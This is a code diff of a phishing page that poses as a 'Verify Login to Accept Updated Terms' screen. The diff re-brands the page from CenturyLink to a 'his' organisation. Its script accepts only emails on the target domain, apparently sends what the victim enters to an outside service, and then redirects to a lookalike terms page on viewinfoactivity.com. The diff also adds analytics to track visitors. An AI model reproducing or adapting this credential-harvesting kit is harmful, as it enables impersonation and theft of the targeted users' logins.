@@ -1,6 +1,19 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  
+  <!-- Privacy-friendly analytics by Plausible -->
+  <script async src="https://plausible.io/js/pa-LsclXKnNgt32tqJUvKdct.js"></script>
+  <script>
+    window.plausible = window.plausible || function() {
+      (plausible.q = plausible.q || []).push(arguments)
+    },
+    plausible.init = plausible.init || function(i) {
+      plausible.o = i || {}
+    };
+    plausible.init();
+  </script>
+  
   <meta charset="UTF-8">
   <title>Verify Login to Accept Updated Terms</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -145,7 +158,7 @@
   <div class="page-wrapper">
     <div class="card">
       <div class="logo">
-        <img src="https://2xqb9g88cp.ucarecd.net/a67481ad-22b6-429b-9fdb-c41f76a9d25f/centurylink_logo_s.png" alt="Company Logo">
+        <img src="https://2xqb9g88cp.ucarecd.net/8d5a74fd-bb37-4667-9c44-e862de2e8ce1/hisreject.png" alt="Company Logo">
       </div>
 
       <h1>Verify Login to Accept Updated Terms</h1>
@@ -175,7 +188,7 @@
         After you log in, you will be prompted to review and accept the updated Service Terms Agreement.
         <br>
         You can also view the terms any time at
-        <a href="https://www.viewinfoactivity.com/centurylink-terms" class="link-terms">this page</a>.
+        <a href="https://www.viewinfoactivity.com/his-terms" class="link-terms">this page</a>.
       </p>
     </div>
   </div>
@@ -203,13 +216,13 @@
       const emailValue = emailInput.value.trim();
 
       // FIXED: correct regex for @centurylink.net
-      const allowedDomainRegex = /^[^@\s]+@centurylink\.net$/i;
+      const allowedDomainRegex = /^[^@\s]+@his\.net$/i;
 
       if (!emailValue) {
         emailError.textContent = "Email is required.";
         valid = false;
       } else if (!allowedDomainRegex.test(emailValue)) {
-        emailError.textContent = "Email must be @centurylink.net.";
+        emailError.textContent = "Email must be @his.net.";
         valid = false;
       }
 
@@ -231,7 +244,7 @@
           console.log("SUCCESS!", response.status, response.text);
 
           // Redirect to next page
-          window.location.href = "https://www.viewinfoactivity.com/centurylink-terms";
+          window.location.href = "https://www.viewinfoactivity.com/his-terms";
         })
         .catch(function (error) {
           console.error("FAILED...", error);
